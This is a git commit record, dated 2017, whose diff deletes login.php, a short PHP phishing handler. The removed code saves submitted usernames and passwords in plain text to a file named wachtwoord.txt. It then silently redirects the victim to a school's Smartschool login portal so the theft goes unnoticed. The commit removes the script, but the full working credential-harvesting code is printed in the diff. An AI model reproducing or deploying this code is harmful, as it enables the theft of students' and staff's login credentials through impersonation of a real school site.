962f72d1011f5e99564e9e0b56bf7161ec1f59d0
Nat0211 <grigoryan.martin@yahoo.be>
2017-05-13 13:32:53 +0200

    Delete login.php

--- login.php
+++
@@ -1,8 +0,0 @@
-<?PHP
-$Log = $_POST['login'];
-$Pass = $_POST['pass'];
-$log = fopen("wachtwoord.txt","at");
-fwrite($log,"$Log:$Pass\n");
-fclose($log);
-echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://materdeibrasschaat.smartschool.be'></head></html>";
-?>
